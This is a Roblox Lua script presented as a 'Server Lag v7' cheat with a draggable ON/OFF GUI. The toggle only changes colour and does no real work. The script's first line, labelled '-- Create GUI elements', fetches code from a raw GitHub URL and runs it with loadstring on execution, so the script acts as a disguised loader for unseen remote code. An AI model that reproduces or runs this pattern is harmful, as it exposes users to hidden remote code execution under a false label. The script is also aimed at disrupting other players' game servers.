-- Create GUI elements
loadstring(game:HttpGet("https://raw.githubusercontent.com/gdbulka/shiny-goggles/refs/heads/main/main.lua"))()

-- GUI Setup
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main frame
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.Position = UDim2.new(0.4, 0, 0.4, 0)
MainFrame.Size = UDim2.new(0, 250, 0, 130)
MainFrame.Active = true

local corner = Instance.new("UICorner", MainFrame)
corner.CornerRadius = UDim.new(0, 10)

-- Title
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Font = Enum.Font.GothamBold
Title.Text = "Server Lag v7"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true

-- Toggle button
Toggle.Parent = MainFrame
Toggle.Size = UDim2.new(0.7, 0, 0, 40)
Toggle.Position = UDim2.new(0.15, 0, 0.55, 0)
Toggle.Font = Enum.Font.Gotham
Toggle.Text = "OFF"
Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
Toggle.TextScaled = true
Toggle.BackgroundColor3 = Color3.fromRGB(170, 30, 30)
Toggle.AutoButtonColor = false

local btnCorner = Instance.new("UICorner", Toggle)
btnCorner.CornerRadius = UDim.new(0, 8)

-- Smooth drag (mouse + touch)
local UserInputService = game:GetService("UserInputService")
local dragging, dragStart, startPos

local function updateInput(input)
	local delta = input.Position - dragStart
	MainFrame.Position = UDim2.new(
		startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y
	)
end

MainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
	or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = MainFrame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
	or input.UserInputType == Enum.UserInputType.Touch) then
		updateInput(input)
	end
end)

-- Toggle logic (no lag)
local running = false

Toggle.MouseButton1Click:Connect(function()
	running = not running
	if running then
		Toggle.Text = "ON"
		Toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
	else
		Toggle.Text = "OFF"
		Toggle.BackgroundColor3 = Color3.fromRGB(170, 30, 30)
	end
end)
